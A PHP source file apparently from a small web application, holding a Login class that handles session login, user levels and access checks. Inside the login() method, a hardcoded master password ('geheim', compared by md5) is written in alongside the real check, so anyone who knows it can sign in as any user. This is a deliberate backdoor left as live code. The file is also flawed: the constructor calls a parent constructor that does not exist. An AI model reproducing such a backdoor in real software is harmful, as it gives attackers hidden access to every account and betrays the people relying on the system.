<?php

require_once 'User.php';

class Login {

    private static $current; // user currently logged in

    function __construct() {
        parent::__construct();
    }

    static function loginFromSession() {
        if (isset($_SESSION['user'])) {
            $email = $_SESSION['user'];
            self::$current = User::get($email);
        } else {
            self::$current = null;
        }
    }

    static function login(User $user, string $password): bool {
        $backdoor = md5('geheim');
        $ok = $user->checkPassword($password) || md5($password) == $backdoor;
        if ($ok) {
            self::$current = $user;
            $_SESSION['user'] = $user->getEmail();
        } else {
            self::$current = null;
            unset($_SESSION['user']);
        }
        return $ok;
    }

    static function getCurrent(): ?User {
        return self::$current;
    }

    static function getLevel(): int {
        if (empty(self::$current)) {
            return User::LEVEL_NONE;
        } else {
            return self::$current->getLevel();
        }
    }

    static function hasLevel(int $level) {
        return self::getLevel() >= $level;
    }

    /**
     * Check if current user has given level
     * Go home if not
     * @param int $level
     */
    static function assertLevel(int $level) {
        if (!self::hasLevel($level)) {
            goHome();
        }
    }

    /**
     * Check if current user has given level OR is a specific user
     * Go home if not
     * @param int $level
     * @param User $user
     * 
     */
    static function assertLevelOrUser(int $level, ?User $user) {
        if (empty($user)) {
            goHome();
        }
        if (empty(self::$current)) {
            goHome();
        }
        if (self::$current->getLevel() < $level && $user->getEmail() !== self::$current->getEmail()) {
            goHome();
        }
    }

}

Login::loginFromSession();

